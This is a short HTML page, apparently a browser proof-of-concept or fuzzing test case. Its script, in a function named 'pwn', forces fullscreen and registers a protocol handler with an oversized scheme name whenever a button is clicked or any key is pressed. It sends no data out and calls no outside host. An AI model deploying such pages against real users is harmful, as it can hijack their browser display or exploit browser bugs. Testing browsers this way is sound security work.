<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Modern Browser API Test</title>
</head>
<body>
    <button id="testBtn">Click to Test V4</button>
    <div id="status"></div>
    <script>
        function pwn() {
            // Modern Fullscreen API
            document.documentElement.requestFullscreen().catch(err => {
                document.getElementById('status').textContent = 'Fullscreen error: ' + err.message;
            });
            
            // Register Protocol Handler with VALID long string (ASCII letters only)
            try {
                navigator.registerProtocolHandler(
                    'web+' + 'o'.repeat(200), // Valid: web+ followed by ASCII letters
                    location.href + '?handler=%s',
                    'Test Handler'
                );
                document.getElementById('status').textContent = 'Protocol handler registered!';
            } catch(e) {
                document.getElementById('status').textContent = 'Protocol error: ' + e.message;
            }
        }
        
        // Trigger on button click (user gesture required for modern browsers)
        document.getElementById('testBtn').addEventListener('click', pwn);
        
        // Also trigger on any keydown (like original)
        document.addEventListener('keydown', function(e) {
            pwn();
        });
    </script>
</body>
</html>
